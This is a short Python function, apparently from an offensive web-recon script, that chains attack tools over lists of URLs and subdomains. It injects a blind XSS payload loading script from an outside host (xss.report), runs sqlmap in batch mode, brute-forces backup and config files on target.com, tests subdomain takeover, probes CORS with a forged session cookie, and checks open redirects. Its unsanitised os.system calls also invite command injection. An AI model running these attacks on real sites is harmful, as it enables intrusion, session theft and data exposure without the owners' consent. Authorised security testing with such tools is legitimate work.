import os

def detect_exploits(urls_file, config):
    print("[+] Starting exploitation tests...")
    os.system(f"cat {urls_file} | gf xss | bxss -appendMode -payload \"<script src=https://xss.report/c/coffinxp></script>\" -parameters -o xss_results.txt")
    os.system(f"cat {urls_file} | gf sql | sqlmap --batch")
    os.system(f"dirsearch -u https://www.target.com -e conf,config,bak,backup,swp,old,db,sql,aspx,asp,py,pyw,rb,php,phpw,cache,cgi,csv,html,inc,jar,js,json,jsp,jspx,lock,log,rar,sql,tar,xml,zip -o dirsearch_results.txt")
    os.system(f"subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl > takeover_results.txt")
    os.system(f"python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked' -o cors_results.txt")
    os.system(f"nuclei -list subdomains_alive.txt -t ~/Priv8-Nuclei/cors -o cors_scan_results.txt")
    os.system(f"cat {urls_file} | gf redirect | openredirect -p ~/openRedirectX -o open_redirect_results.txt")
    print("[+] Exploitation tests completed.")
